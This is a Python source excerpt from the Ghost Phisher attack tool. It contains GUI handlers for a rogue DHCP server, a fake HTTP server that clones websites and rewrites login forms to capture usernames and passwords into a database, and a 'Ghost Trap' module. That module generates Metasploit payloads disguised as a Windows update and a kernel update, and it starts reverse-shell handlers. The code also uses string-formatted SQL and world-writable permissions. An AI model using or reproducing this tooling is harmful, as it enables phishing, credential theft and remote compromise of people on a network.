    def scapy_IsInstalled(self):
        try:
            from core import ghost_dhcp
            self.ghost_dhcp_server = ghost_dhcp.Ghost_DHCP_Server()
        except ImportError:
            self.dhcp_start.setEnabled(False)

            self.dhcp_status.append('''<font color=green>Scapy Library is not installed, Please run </font>
            <font color=red>"apt-get install python-scapy" </font><font color=green>on terminal to install</font>''')




    def determine_subnet(self):
        ''' Determines the subnet mask from the
            live ip address input of user
        '''
        start_ip = str(self.start_ip.text())
        try:
            period_number = start_ip.index('.')
            first_octect = start_ip[0:period_number]
            if int(first_octect) in range(1,127):               # Class A IP address (netmask will be 255.0.0.0)
                self.subnet_ip.setText('255.0.0.0')
            elif int(first_octect) in range(128,191):           # Class B IP address (netmask will be 255.255.0.0)
                self.subnet_ip.setText('255.255.0.0')
            else:
                self.subnet_ip.setText('255.255.255.0')         # Class C IP address (netmask will be 255.255.255.0)
        except ValueError:
            pass


    def stop_dhcp(self):
        ''' Stop the DHCP Server'''
        self.lease_count = 0
        self.ghost_dhcp_server.dhcp_control = False

        self.ghost_dhcp_server.hostname_leased = {}


        self.dhcp_start.setEnabled(True)
        self.dhcp_stop.setEnabled(False)

        self.dhcp_status.append(str())
        self.dhcp_status.append('<font color=red>Ghost DHCP Server stopped at %s'%(time.ctime()))


    def create_route(self):
        interface_path = "/sys/class/net"
        linux_route = "route add 255.255.255.255 netmask 0.0.0.0 dev %s"
        for interface in os.listdir(interface_path):
            subprocess.getoutput(linux_route % (interface))


    def launch_dhcp(self):
        ''' Launch DHCP spoofing if all
            conditions are right
        '''
        self.dhcp_control = True

        self.lease_count = 0
        self.displayed_hostname.clear()
        self.ghost_dhcp_server.lease_address = str()                                          # Holds next address to be leased
        self.ghost_dhcp_server.leased_address = set()                                         # Holds list of all leased addresses
        self.ghost_dhcp_server.hostname_leased = {}                                           # Holds hostname to leased address mapping {"SAVIOUR-PC":192.168.0.1}


        start_ip = str(self.start_ip.text())
        stop_ip = str(self.stop_ip.text())
        gateway_ip = str(self.gateway_ip.text())
        fakedns_ip = str(self.fakedns_ip.text())
        subnet_ip = str(self.subnet_ip.text())
        alternatedns_ip = str(self.alternatedns_ip.text())

        if start_ip.count('.') != 3:                                   # Check if inputed data is valid
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (From:) section")
        elif stop_ip.count('.') != 3:
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (To:) section")
        elif gateway_ip.count('.') != 3:
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Gateway Address:) section")
        elif fakedns_ip.count('.') != 3:
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Fake DNS IP:) section, input the address from the fake DNS")
        elif alternatedns_ip.count('.') != 3:
            QtWidgets.QMessageBox.warning(self,"Invalid IP Address","Please input a valid IP address on the (Alternate  DNS IP :) section, is best you input a real DNS server IP address here to fasten HTTP responce on an intranet based networks")
        else:
            ghost_settings.create_settings('self.start_ip',start_ip)                   # Write settings to last_settings file
            ghost_settings.create_settings('self.stop_ip',stop_ip)
            ghost_settings.create_settings('self.fakedns_ip',fakedns_ip)
            ghost_settings.create_settings('self.gateway_ip',gateway_ip)
            ghost_settings.create_settings('self.subnet_ip',subnet_ip)
            ghost_settings.create_settings('self.alternatedns_ip',alternatedns_ip)


            try:

                self.ghost_dhcp_server.conf["From"] = start_ip
                self.ghost_dhcp_server.conf['To'] = stop_ip
                self.ghost_dhcp_server.conf["Subnet Mask"] = subnet_ip
                self.ghost_dhcp_server.conf["Default Gateway"] = gateway_ip
                self.ghost_dhcp_server.conf["Pref DNS"] = fakedns_ip
                self.ghost_dhcp_server.conf["Alt DNS"] = alternatedns_ip

                _thread.start_new_thread(self.thread_server,())

                self.dhcp_status.clear()
                self.dhcp_status.append('<font color=green>Started Ghost DHCP Server at %s </font>'%(time.ctime()))  # DHCP ran successfully
                self.dhcp_status.append(" ")

                self.dhcp_start.setEnabled(False)
                self.dhcp_stop.setEnabled(True)

                _thread.start_new_thread(self.thread_loop_lease,())

            except Exception as dhcp_failure:
                self.dhcp_status.append('<font color=red>%s</font>'%(dhcp_failure))  # DHCP did not run successfully


    def thread_server(self):
        self.ghost_dhcp_server.dhcp_control = True
        self.ghost_dhcp_server.Start_DHCP_Server()


    def thread_loop_lease(self):
        self.loop_Lease()


    def loop_Lease(self):
        while(True):
            if not self.ghost_dhcp_server.dhcp_control:
                break
            lease_num = len(list(self.ghost_dhcp_server.hostname_leased.keys()))
            if(lease_num > self.lease_count):
                self.lease_count += 1
            time.sleep(1)


    def display_leases_client(self):
        for hostname in list(self.ghost_dhcp_server.hostname_leased.keys()):
            if(hostname not in list(self.displayed_hostname)):
                address = self.ghost_dhcp_server.hostname_leased[hostname]
                self.dhcp_status.append('<font color=blue>' + hostname + ' has been leased ' + address + '</font>')
            self.displayed_hostname.add(hostname)






    #########################################################################
    #       FAKE HTTP SERVER DEFINITION ,FUNCTIONS AND SIGNALS              #
    #########################################################################

    def HTTP_initialization(self):
        '''Starts and read HTTP server responces'''
        global http_terminal
        global http_control
        global request_response
        global http_server_port

        html_folder = ''                                        # Get the html resource directory e.g index_files
        for file_ in os.listdir(cwd + '/HTTP-Webscript/'):
            if os.path.isdir(cwd + '/HTTP-Webscript/' + file_):
                html_folder += file_

        if not bool(html_folder):
            html_folder = 'Null'

        self.fake_http_object = GhostHTTPServer('0.0.0.0',http_server_port,html_folder,cwd,self.form_variables[0],self.form_variables[1]) # Username/Password varaible are from the form pages
        self.fake_http_object.new_credential.connect(self.new_credential)
        self.fake_http_object.new_remote_host.connect(self.new_host)
        os.environ["ghost_fake_http_control"] = "start"           # Control the fake http process from API (True == Start Server)
        self.fake_http_object.start()



    def stop_http(self):
        ''' Stop the DHCP Server'''
        global http_terminal
        global http_control
        global http_address                 # Holds the address where Fake HTTP server is running e.g http://192.168.0.1/
        http_control = 1
        self.http_start.setEnabled(True)
        self.fake_http_object.quit()        # Kill fake HTTP Server
        self.http_stop.setEnabled(False)
        os.environ["ghost_fake_http_control"] = "stop"           # Control the fake http process from API (False == Stop Server)
        self.status_textbrowser_http.append('<font color=red>HTTP Server Stopped at: %s</font>'%(time.ctime()))
        self.http_ip_label.setText('<font color=green>Service running on:</font>  Service not started')
        self.label_13.setText('<font color=green>Runtime:</font>  Service not started')




    def new_host(self):
        '''logs remote host details'''
        self.status_textbrowser_http.append('<font color=blue>' + self.fake_http_object.remote_connection + '</font>')



    def new_credential(self):
        ''' Inputs data to Database Table after
            quering from database file
        '''
        global captured_credential

        raw_website = str(self.lineEdit_2.text())
        raw_username = str(self.fake_http_object.credentials[0])
        raw_password = str(self.fake_http_object.credentials[1])

        self.database_commit(raw_website,raw_username,raw_password)

        database_items = self.fetch_data()
        self.credential_table.setRowCount(0)
        for iterate, current_credential in enumerate(database_items):
            # Skip malformed rows safely
            if not current_credential or len(current_credential) < 3:
                continue

            self.credential_table.insertRow(iterate)

            website  = QtWidgets.QTableWidgetItem(str(current_credential[0]))
            username = QtWidgets.QTableWidgetItem(str(current_credential[1]))
            password = QtWidgets.QTableWidgetItem(str(current_credential[2]))

            self.credential_table.setItem(iterate, 0, website)
            self.credential_table.setItem(iterate, 1, username)
            self.credential_table.setItem(iterate, 2, password)
        captured_credential += 1
        self.http_captured_credential.setText('captured credentials:<font color=green>\t %s</font>'%(captured_credential))




    def set_usable(self):
        ''' Disables un-used settings buttons if
            not selected
        '''
        if self.emulate_website_radio.isChecked():
            self.website_button.setEnabled(False)
            try:
                self.emulate_website_label.setPlaceholderText("http:// or https://")
            except:
                self.emulate_website_label.setText("http:// or https://")
                self.emulate_website_label.selectAll()
                self.emulate_website_label.setFocus()
            self.website_linedit.clear()

        else:
            self.website_button.setEnabled(True)
            self.emulate_website_label.clear()



    def update_http_address(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of http interface
            card combobox
        '''
        global usable_interface_cards   # Dictionary holding IP / Interface card mappings

        ip_address = []                 #Holds ip address of the selected card

        selected_http_interface_card = str(self.http_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_http_interface_card])
        except KeyError:
            pass
        self.http_ip_combo.clear()                                       #clear the ip address combo
        self.http_ip_combo.addItems(ip_address)                          #display ip address on combo
        self.current_card_label_2.setText("<font color=green>\
                                        Current Interface:</font>  %s"%(selected_http_interface_card))


    def browse_webpage(self):
        ''' Browse and select webpages that
            are intended to be hosted
        '''
        webpage = QtWidgets.QFileDialog.getOpenFileName(self,"Select Webpage","","HTML Scripts(*.html *.htm)")
        if webpage != '':
            self.website_linedit.setText(webpage)
            ghost_settings.create_settings('self.website_linedit',webpage)

        if os.path.exists(cwd + '/HTTP-Webscript'):
            shutil.rmtree(cwd + os.sep + 'HTTP-Webscript')



    def launch_http_server(self):
        ''' Evaluates user settings and launches
            webserver to host web-script
        '''
        self.status_textbrowser_http.clear()

        if self.capture_radio.isChecked():                          # Capture Mode is enabled
            if len(str(self.lineEdit_2.text())) < 3:
                QtWidgets.QMessageBox.warning(self,'Invalid URL or IP address','Please input the original url or ip address of the spoofed website')
            else:
                self.start_http_service()
        else:
            self.start_http_service()


    def start_http_service(self):
        '''Starts the HTTP Service'''
        global html_source
        global http_address
        global http_server_port

        http_error = 0               # Informs conditional blocks of success of other blocks

        actions_ip_address = str(self.http_ip_combo.currentText())

        if self.run_webpage_port_radio.isChecked():     # Check if http port section has been changed
            try:
                http_server_port = int(self.use_port_http.text())
            except ValueError:
                QtWidgets.QMessageBox.warning(self,"Invalid Port Number","Please input a valid port number on the (Run Webpage on Port :) section")

        if os.path.exists(cwd + '/HTTP-Webscript'):     # Create web directory if it does not exist
            shutil.rmtree(cwd + '/HTTP-Webscript')
        os.mkdir(cwd + '/HTTP-Webscript')

        if 'Ghost-Phisher-Database' not in os.listdir(cwd): # Create Database directory
            os.mkdir('Ghost-Phisher-Database')



        if self.select_website_radio.isChecked():

            web_script = str(self.website_linedit.text())
            webserver_path = cwd + os.sep + 'HTTP-Webscript' + os.sep

            if not web_script:
                http_error += 1
                QtWidgets.QMessageBox.warning(self,"Invalid Web-Script","Please browse and select a web-script to host from the (Select Webpage:) section")
            else:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')

                html_file = web_script.split('/')[-1]           # Holds file name like (index.html)
                html_name = re.findall(r"(\S*)\.",html_file)[0]            # Holds variable like (index)
                folder_path = web_script.replace(html_file,"")

                html_folder = ""                           # Holds folder name like (index_files)

                if os.path.exists(folder_path + html_name + "_files"):
                    html_folder = str(html_name + "_files")
                    html_file_folder = folder_path + html_name + "_files"
                elif os.path.exists(folder_path + html_name + "_FILES"):
                    html_folder = str(html_name + "_FILES")
                    html_file_folder = folder_path + html_name + "_FILES"   # html_file_folder = /root/Desktop/index_files
                else:
                    html_folder = None
                    html_file_folder = None

                shutil.copyfile(web_script,webserver_path + html_file)

                if html_file_folder:
                    shutil.copytree(html_file_folder,webserver_path + html_folder)

                try:
                    os.rename('%s/HTTP-Webscript/%s'%(cwd,html_file),'%s/HTTP-Webscript/index.html'%(cwd))               # rename our webscript to what the web server can host

                    self.status_textbrowser_http.append('<font color=green>Moving webscript files to Web-Server directory...</font>')

                except OSError as e:
                    self.status_textbrowser_http.append('<font color=red>Unable to start HTTP Server: %s</font>'%(e))
                    http_error += 1

        else:
            website_url = str(self.emulate_website_label.text())
            if len(website_url) > 7:
                self.status_textbrowser_http.append('<font color=green>Starting HTTP Server...</font>')
                if os.path.exists(cwd + '/HTTP-Webscript'):
                    shutil.rmtree(cwd + os.sep + 'HTTP-Webscript') # Remove old html files already there
                os.mkdir(cwd + '/HTTP-Webscript')
                try:
                    url_source = urllib.request.urlopen(website_url)                    # Get the source code of the website and write an HTML file of the website
                    with open("HTTP-Webscript/index.html", "wb") as web_script:
                        web_script.write(url_source.read())
                    self.status_textbrowser_http.append('<font color=green>Successfully cloned %s</font>'%(website_url))
                except(urllib.error.URLError):
                    self.status_textbrowser_http.append('<font color=red>Unable to fetch and clone website: network timeout</font>')
            else:
                QtWidgets.QMessageBox.warning(self,"Invalid URL","Please input a valid url to the (Clone Website:) text area \n e.g http://www.foo-bar.com")

            #
            # Giving the file and Database directory run permission, else HTTP server will not submit any POST request
            #
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0o777)

        if self.ghost_dns.control_dns:
            if http_server_port == 80:
                http_address = 'http://%s/'%(str(self.lineEdit_2.text()))  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(str(self.lineEdit_2.text(),http_server_port))    # Evaluate server address e,g http://192.168.0.23:8080/

        else:
            actions_ip_address = str(self.http_ip_combo.currentText())
            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)  # If DNS is activated then give e.g http://www.foo-bar/ instead of http://192.168.0.23/
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)    # Evaluate server address e,g http://192.168.0.23:8080/

        html_file = open('%s/HTTP-Webscript/index.html'%(cwd))
        html_source = html_file.read()

        if self.capture_radio.isChecked():                                                      # Capture Mode is enabled
            form_login_variables = []

            regex_post = re.compile(r'<label\s*for\S*">',re.IGNORECASE)
            regex_post_process = re.compile(r'name="(\S*)"',re.IGNORECASE)
            regex = re.compile(r"action\S*|action\s*=\s*\S*",re.IGNORECASE)                      # Matches any html "action" variable

            new_post_action = regex.sub('action="/login.php"',html_source)          # Replaces action variable with ours e.g <action="http://192.168.0.23/login.php">

            combinations =  re.findall(r"(<input[\w\s=\"-]+>)",html_source)
            for index,combination in enumerate(combinations):
                if(re.findall("type='?\"password'?\"",combination)):
                    username_tag =  combinations[index - 1]
                    password_tag = combinations[index]

                    username = re.findall(r"name=\"(\S+)\"",username_tag)[0]
                    password = re.findall(r"name=\"(\S+)\"",password_tag)[0]

                    form_login_variables = [username,password]

            self.form_variables = form_login_variables       # Store to database, website form variables e.g ['email','pass']

            if not self.form_variables:
                self.form_variables = ["NULL","NULL"]

            ghost_settings.create_settings('self.lineEdit_2',str(self.lineEdit_2.text()))
            #
            # Check if html source has a valid Post action method
            #
            os.remove('%s/HTTP-Webscript/index.html'%(cwd))                     # Remove index script
            new_html_file = open('%s/HTTP-Webscript/index.html'%(cwd),'a+')     # Rewrite to incude our new action url
            new_html_file.write(new_post_action)
            new_html_file.close()

            self.status_textbrowser_http.append('<font color=green>Scanning packets for possible login details')


        else:                                                              # Hosting Mode is enabled
            self.form_variables = ["NULL","NULL"]
            self.status_textbrowser_http.append('<font color=green>Website Hosting activated</font>')



        if http_error == 0:      # Means that we hitted this block without any errors from the other blocks
            self.http_start.setEnabled(False)
            self.http_stop.setEnabled(True)
            self.http_captured_credential.setText('captured credentials:')
            self.http_port_label.setText('<font color=green>TCP Port:</font> %s'%(http_server_port))
            self.http_ip_label.setText('<font color=green>Service running on:</font>  %s'%(actions_ip_address))
            self.label_13.setText('<font color=green>Runtime:</font>  %s'%(time.ctime()))

            if os.path.exists('/tmp/original.html'):                    # Delete original source if it already exist in the tmp directory
                os.remove('/tmp/original.html')

            original_source = open('/tmp/original.html','a+')
            original_source.write(html_source)
            original_source.close()

################# HERERERERERERER######################################################################
            _thread.start_new_thread(self.HTTP_initialization,())        # Start HTTP Sever thread


            if http_server_port == 80:
                http_address = 'http://%s/'%(actions_ip_address)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))
            else:
                http_address = 'http://%s:%s/'%(actions_ip_address,http_server_port)
                self.status_textbrowser_http.append('<font color=green>HTTP Server running on: %s</font>'%(http_address))

            self.status_textbrowser_http.append('')







    #########################################################################
    #       CREDENTIAL HARVEST DEFINITION ,FUNCTIONS AND SIGNALS            #
    #########################################################################


    def database_commit(self,website,username,password):
        ''' Commits captured credential to database'''
        database = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        database_query = database.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute("insert into credentials values ('%s','%s','%s')"% (website,username,password))
        database.commit()
        database.close()


    def fetch_data(self):
        ''' Function searches for new entries in database
            and displays it on the database table
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0o777)
        database_read = sqlite3.connect(cwd + '/Ghost-Phisher-Database/' + 'database.db')
        os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0o777)
        database_query = database_read.cursor()
        database_query.execute('create table if not exists credentials (website text, username text, password text)')
        database_query.execute('select * from credentials')
        database_values = database_query.fetchall()
        database_read.close()
        return database_values



    def insert_credential(self):
        ''' insert a new row on the database table'''
        self.credential_table.insertRow(0)


    def delete_credential(self):
        ''' deletes current row on the database table'''
        selected_row = self.credential_table.currentRow()
        self.credential_table.removeRow(selected_row)


    def save_changes(self):
        ''' Removes our old database,creates a new
            one and commits changes to the new
            database
        '''
        if 'Ghost-Phisher-Database' not in os.listdir(cwd):
            os.mkdir(cwd + '/Ghost-Phisher-Database')
            os.chmod('%s/Ghost-Phisher-Database'%(cwd),0o777)
        if 'database.db' in os.listdir(cwd + '/Ghost-Phisher-Database'):
            os.remove(cwd + '/Ghost-Phisher-Database/' + 'database.db')

        row_number = self.credential_table.rowCount()

        for iterate in range(0,row_number):
            try:
                website = QtWidgets.QTableWidgetItem(self.credential_table.item(iterate,0))
                username = QtWidgets.QTableWidgetItem(self.credential_table.item(iterate,1))
                password = QtWidgets.QTableWidgetItem(self.credential_table.item(iterate,2))
                self.database_commit(website.text(),username.text(),password.text())        # Save data to database
            except TypeError:
                QtWidgets.QMessageBox.warning(self,'Null Field Detected','Please remove white spaces or rows with empty data')

        try:
            os.chmod('%s/Ghost-Phisher-Database/database.db'%(cwd),0o777)
        except OSError:
            pass



    #######################################################
    #           GHOST TRAP FUNCTIONS AND SIGNALS          #
    #######################################################

    def update_ghost_spawn_interfaces(self):
        ''' Changes the ipaddress on ip combo when
            user changes the index of interface combo
        '''
        global usable_interface_cards

        ip_address = []             #Holds ip address of the selected card

        selected_interface = str(self.spawn_http_interface_combo.currentText())   #currently selected interface card
        try:
            ip_address.append(usable_interface_cards[selected_interface])
        except KeyError:
            pass
        self.spawn_ip_combo.clear()                                       #clear the ip address combo
        self.spawn_ip_combo.addItems(ip_address)                          #display ip address on combo
        self.ip_address_edit.setText(self.spawn_ip_combo.currentText())



    def vulnarabilty_page_choice(self):
        if(self.ghost_vul_combo.isChecked()):
            self.custom_page_label_2.setEnabled(False)
            self.custom_page_button.setEnabled(False)
            self.custom_page_label.setEnabled(False)
        else:
            self.custom_page_label_2.setEnabled(True)
            self.custom_page_button.setEnabled(True)
            self.custom_page_label.setEnabled(True)


    def metasploit_payload_choice(self):
        self.metasploit_installation()
        self.metasploit_settings_box.setVisible(True)
        self.custom_payload_box.setVisible(False)
        self.custom_payload_radio.setChecked(False)



    def custom_payload_choice(self):
        self.ghost_spawn_start.setEnabled(True)
        self.ghost_spawn_stop.setEnabled(False)
        self.ghost_spawn_browser.clear()
        self.metasploit_settings_box.setVisible(False)
        self.custom_payload_box.setVisible(True)
        self.metasploit_payload_radio.setChecked(False)


    def encode_number_list(self):
        encode_int = []
        for number in range(1,17):
            encode_int.append(str(number))
        self.comboBox_2.addItems(encode_int)


    def metasploit_payloads(self):
        self.encode_combo.addItems(variables.metasploit_encoders)
        self.linux_payload_combo.addItems(variables.metasploit_linux_payloads)
        self.windows_payload_combo.addItems(variables.metasploit_windows_payloads)


    def metasploit_is_installed(self):
        msfconsole = subprocess.getstatusoutput('which msfconsole')[0]
        msfencode = subprocess.getstatusoutput('which msfencode')[0]
        msfpayload = subprocess.getstatusoutput('which msfpayload')[0]

        if bool(msfconsole) and bool(msfencode) and bool(msfpayload):
            return(False)
        return(True)



    def metasploit_installation(self):
        if not self.metasploit_is_installed():
            self.ghost_spawn_browser.clear()
            self.ghost_spawn_browser.append('<font color=red>Metasploit framework is currently not installed on this\
            computer, please visit </font><font color=blue><a href="http://www.metasploit.com/">http://www.metasploit.com/</a></font><font color=red> to get a working copy</font>')
            self.metasploit_settings_box.setEnabled(False)
            self.ghost_spawn_start.setEnabled(False)
            self.ghost_spawn_stop.setEnabled(False)


    def browse_custom_webpage(self):
        self.custom_spawn_page_path = str(QtWidgets.QFileDialog.getOpenFileName(self,"Browse Webpage","","HTML Files(*.html *.htm)"))
        if self.custom_spawn_page_path:
            self.custom_page_label_2.setText(self.custom_spawn_page_path)


    def custom_windows_executable_payload(self):
        if not self.windows_exec_checkbox.isChecked():
            QtWidgets.QMessageBox.warning(self,"Custom windows payload not selected","Please click on the windows checkbox to activate this option")
        else:
            self.custom_windows_exec_path = str(QtWidgets.QFileDialog.getOpenFileName(self,"Browse Windows Executable",""))

            if self.custom_windows_exec_path:
                self.windows_exec_edit.setText(self.custom_windows_exec_path)


    def custom_linux_executable_payload(self):
        if not self.linux_exec_checkbox.isChecked():
            QtWidgets.QMessageBox.warning(self,"Custom Linux payload not selected","Please click on the linux checkbox to activate this option")
        else:
            self.custom_linux_exec_path = str(QtWidgets.QFileDialog.getOpenFileName(self,"Browse Linux Executable",""))

            if self.custom_linux_exec_path:
                self.linux_exec_edit.setText(self.custom_linux_exec_path)


    # USER PROCESS DISPLAY

    def clear_all_displays(self):
        self.ghost_spawn_browser.clear()
        self.nitialize_label.setEnabled(False)
        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.setting_payload_label.setEnabled(False)
        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.create_cache_label.setEnabled(False)
        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.http_start_label.setEnabled(False)
        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_initialization(self,status):
        self.ghost_spawn_browser.clear()

        if not self.ghost_dns.control_dns:
            self.display_error_message("DNS Server is currently not started,\
            it is recommended that you use this attack with the DNS server for optimum client redirections")

        if status:
            self.ghost_spawn_browser.append('<font color=green>Starting Internal Processes...</font>')
            self.nitialize_label.setEnabled(True)
            self.initlaize_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.nitialize_label.setEnabled(False)
            self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))



    def display_payload_initlializaton(self,status):
        if status:
            self.setting_payload_label.setEnabled(True)
            self.payload_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.setting_payload_label.setEnabled(False)
            self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_cache_initialization(self,status):
        if status:
            self.create_cache_label.setEnabled(True)
            self.cache_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.create_cache_label.setEnabled(False)
            self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_http_initlialization(self,status):
        if status:
            self.http_start_label.setEnabled(True)
            self.start_http_led.setPixmap(QtGui.QPixmap(self.green_led))
        else:
            self.http_start_label.setEnabled(False)
            self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))


    def display_error_message(self,message):
        self.ghost_spawn_browser.append('<font color=red>' + message + '</font>')

    def display_information(self,color,message):
        self.ghost_spawn_browser.append('<font color=%s>%s</font>'%(color,message))


    def display_new_connection(self):
        self.display_information("blue",ghost_trap_http.control_settings['new connection'])


    def new_download(self):
        self.display_information("blue",ghost_trap_http.control_settings['new download'])



    # METASPLOIT PAYlOAD ERRORS

    def metasploit_windows_error(self):
        self.display_error_message("Metasploit Windows Payload Creation failed: %s"%(\
        self.metasploit_object.variables['windows payload error']))
        self.metasploit_object.terminate()


    def metasploit_linux_error(self):
        self.display_error_message("Metasploit Linux Payload Creation failed: %s"%(\
        self.metasploit_object.variables['linux payload error']))
        self.metasploit_object.terminate()

    # Stop GHOST TRAP SERVER

    def ghost_trap_stop(self,show_time = True):
        os.environ["ghost_trap_http_server"] = "stop"
        ghost_trap_http.cookies = []
        self.ghost_spawn_stop.setEnabled(False)
        self.ghost_spawn_start.setEnabled(True)
        if(show_time == True):
            self.display_error_message("Stopped at %s"%(time.ctime()))
        self.nitialize_label.setEnabled(False)
        self.initlaize_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.setting_payload_label.setEnabled(False)
        self.payload_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.create_cache_label.setEnabled(False)
        self.cache_led.setPixmap(QtGui.QPixmap(self.red_led))
        self.http_start_label.setEnabled(False)
        self.start_http_led.setPixmap(QtGui.QPixmap(self.red_led))
        subprocess.getstatusoutput("killall xterm")


    # EVALUATE USER OPTIONS


    def launch_ghost_trap(self):
        try:
            self.clear_all_displays()
            os.environ["ghost_trap_http_server"] = "start"                                  # Activates Ghost Trap Http Server API

            if self.ghost_vul_combo.isChecked():
                ghost_trap_http.control_settings['windows_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/windows_default.htm'   # Ghosts Default vulnerability Page
                ghost_trap_http.control_settings['linux_webpage'] = str(os.getcwd()) + '/Cache/WEBPAGES/linux_default.htm'   # Ghosts Default vulnerability Page
                self.display_initialization(True)
                self.Stage_2_process()
            else:
                if not self.custom_page_label_2.text():
                    self.clear_all_displays()
                    QtWidgets.QMessageBox.warning(self,"Invalid Custom Page Path","Please Browse and select a custom webpage to use")
                else:
                    ghost_trap_http.control_settings['windows_webpage']  = str(self.custom_page_label_2.text())   # Use Custom Vulnerability page
                    ghost_trap_http.control_settings['linux_webpage']  = str(self.custom_page_label_2.text())
                    self.display_initialization(True)
                    self.Stage_2_process()

        except Exception as exception_string:
            self.display_information('red',"Failed to Start: " + str(exception_string))
            self.ghost_trap_stop(False)


    def Stage_2_process(self):
        if self.metasploit_payload_radio.isChecked():   # If Metasploit Payload is Selected as Choice

            self.metasploit_object = metasploit_payload.metasploit()             # Metasploit Thread class redefined

            ghost_trap_http.control_settings['windows_payload'] = "/tmp/Windows-RPC-KB925256-ENU.exe"
            ghost_trap_http.control_settings['linux_payload'] = "/tmp/kernel_1.72_update_i386.run"

            self.display_payload_initlializaton(True)

            encoder_number = str(self.comboBox_2.currentText())
            encoder_type = str(self.encode_combo.currentText())
            ip_address = str(self.ip_address_edit.text())
            port_setting = str(self.port_setting_edit.text())
            linux_payload = str(self.linux_payload_combo.currentText())
            windows_payload = str(self.windows_payload_combo.currentText())

            self.display_information('green',"Creating Payloads...")

            self.metasploit_object.payloads_created_successfully.connect(self.Stage_3_process)
            self.metasploit_object.windows_payload_error.connect(self.metasploit_windows_error)
            self.metasploit_object.linux_payload_error.connect(self.metasploit_linux_error)

            # Settings Metasploit Class variables

            self.metasploit_object.variables['encode_number'] = encoder_number
            self.metasploit_object.variables['encoder_type'] = encoder_type
            self.metasploit_object.variables['ip_address'] = ip_address
            self.metasploit_object.variables['port_setting'] = port_setting
            self.metasploit_object.variables['linux_payload'] = linux_payload
            self.metasploit_object.variables['windows_payload'] = windows_payload

            if os.path.exists(ghost_trap_http.control_settings['windows_payload']):     # Delete Old windows payload files
                os.remove(ghost_trap_http.control_settings['windows_payload'])

            if os.path.exists(ghost_trap_http.control_settings['linux_payload']):       # Delete Old Linux payload files
                os.remove(ghost_trap_http.control_settings['linux_payload'])

            self.metasploit_object.variables['template'] = os.getcwd() + os.sep + 'Cache/template.exe'
            self.metasploit_object.variables['output_path_windows'] = ghost_trap_http.control_settings['windows_payload']    # Create New windows payload file

            self.metasploit_object.variables['output_path_linux'] = ghost_trap_http.control_settings['linux_payload']

            self.metasploit_object.start()                               # Starts the Payload creation thread

            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- WINDOWS
            if(os.path.exists("/tmp/windows.rc")):
                os.remove("/tmp/windows.rc")

            windows_resource_object = open("/tmp/windows.rc","a+")
            windows_resource_object.write("use multi/handler\n")
            windows_resource_object.write("set payload %s\n" % (windows_payload))
            windows_resource_object.write("set LHOST %s\n" % (ip_address))
            windows_resource_object.write("set LPORT %s\n" % (str(port_setting)))
            windows_resource_object.write("exploit -j\n")
            windows_resource_object.close()

            windows_console_string = '''xterm -geometry 100 -T "Metasploit (Windows)" -e "msfconsole -r /tmp/windows.rc"'''

            # DISPLAY XTERM HERE FOR METASPLOIT PAWNAGE -- LINUX
            if(os.path.exists("/tmp/linux.rc")):
                os.remove("/tmp/linux.rc")

            linux_resource_object = open("/tmp/linux.rc","a+")
            linux_resource_object.write("use multi/handler\n")
            linux_resource_object.write("set payload %s\n" % (linux_payload))
            linux_resource_object.write("set LHOST %s\n" % (ip_address))
            linux_resource_object.write("set LPORT %s\n" % (str(int(port_setting) + 1)))
            linux_resource_object.write("exploit -j\n")
            linux_resource_object.close()

            linux_console_string = '''xterm -geometry 100 -T "Metasploit (Linux)" -e "msfconsole -r /tmp/linux.rc"'''

            if self.respond_to_all_radio.isChecked():
                subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)
                subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

            elif self.respond_windows_radio.isChecked():
                subprocess.Popen(windows_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)

            else:
                subprocess.Popen(linux_console_string,shell=True,stdin = subprocess.PIPE,stderr = subprocess.PIPE)




        else:                                                       # If Custom payload is selected as Choice
            progress = 0
            if bool(self.windows_exec_checkbox.isChecked()) and bool(self.windows_exec_edit.text()):
                ghost_trap_http.control_settings['windows_payload'] = str(self.windows_exec_edit.text())
                ghost_settings.create_settings("self.windows_exec_edit",str(self.windows_exec_edit.text()))
                progress += 1
            else:
                self.display_payload_initlializaton(False)
                self.display_error_message("Custom windows payload is not setted, please check settings")

